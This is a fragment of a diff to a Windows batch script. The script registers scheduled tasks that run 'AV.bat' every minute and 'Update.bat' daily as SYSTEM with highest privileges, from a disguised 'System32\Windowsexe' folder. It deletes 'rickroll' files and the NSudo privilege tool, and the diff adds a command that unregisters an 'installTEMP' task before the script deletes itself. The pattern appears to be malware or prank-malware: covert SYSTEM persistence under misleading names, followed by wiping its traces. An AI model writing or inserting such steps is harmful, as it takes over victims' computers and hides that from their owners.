@@ -31,6 +31,7 @@ SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN
 SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
 del /f rickroll.*
 del /f NSudo.exe
+powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
